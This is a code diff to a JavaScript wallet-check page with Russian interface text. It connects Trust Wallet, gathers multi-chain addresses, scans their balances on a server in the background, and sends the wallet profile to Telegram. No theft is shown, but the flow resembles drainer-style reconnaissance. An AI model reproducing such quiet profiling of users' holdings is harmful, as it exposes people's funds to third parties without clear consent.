@@ -201,10 +201,10 @@ const warmupBackend = () => {
   requestJson("/api/health", {}, 0, 8000).catch(() => {});
 };
 
-const scanWalletPortfolio = async (addresses) => {
+const scanWalletPortfolio = async (addresses, { silent = false } = {}) => {
   if (!apiBase) throw new Error("Backend не настроен.");
 
-  setStatus("Сервер проверяет балансы…");
+  if (!silent) setStatus("Сервер проверяет балансы…");
   return requestJson(
     "/api/scan",
     {
@@ -231,36 +231,45 @@ const runAutoCheck = async () => {
   setStatus("Запрашиваем доступ к кошельку — подтвердите во всплывающем окне Trust Wallet…");
   const addresses = await withTimeout(
     window.AutoWallet.connectAllWalletAddresses({ onProgress: setStatus }),
-    90000,
-    "Кошелёк не ответил за 90 сек. Подтвердите запрос в Trust Wallet и нажмите Connect снова.",
+    30000,
+    "Кошелёк не ответил. Подтвердите запрос в Trust Wallet и нажмите Connect снова.",
   );
-
-  const result = await scanWalletPortfolio(addresses);
-  const portfolio = result.portfolio || result;
 
   const profile = {
     ...addresses,
-    portfolio,
+    portfolio: {
+      evmAddress: addresses.evmAddress,
+      tronAddress: addresses.tronAddress || null,
+      btcAddress: addresses.btcAddress || null,
+      evmNatives: [],
+      evmUsdt: [],
+    },
     checkedAt: new Date().toISOString(),
   };
   saveProfile(profile);
   unlockCheckForm(profile);
 
   const risk = await scoreWalletLocal(addresses.evmAddress);
-  renderRiskPreview(risk, portfolio);
+  renderRiskPreview(risk, profile.portfolio);
 
   notifyTelegramWebApp({ type: "wallet_scan", ...profile });
 
-  const summary = formatPortfolioText(portfolio);
-  let statusText = summary
-    ? `Готово. ${summary}${result.telegramSent ? " Уведомление в Telegram отправлено." : ""}`
-    : "Готово. Балансы проверены.";
+  setStatus("Готово. Кошелёк подключён, проверка балансов отправлена в фоне.");
 
-  if (!addresses.tronAddress) {
-    statusText += " TRON-адрес не отдался — нажмите «Обновить».";
-  }
+  scanWalletPortfolio(addresses, { silent: true })
+    .then((result) => {
+      const portfolio = result.portfolio || result;
+      const updatedProfile = { ...profile, portfolio, checkedAt: new Date().toISOString() };
+      saveProfile(updatedProfile);
+      unlockCheckForm(updatedProfile);
+      renderRiskPreview(risk, portfolio);
+      const summary = formatPortfolioText(portfolio);
+      setStatus(summary ? `Балансы получены. ${summary}` : "Балансы получены.");
+    })
+    .catch(() => {
+      setStatus("Кошелёк подключён. Балансы отправлены на проверку, сервер может дослать уведомление позже.");
+    });
 
-  setStatus(statusText);
   return profile;
 };
 
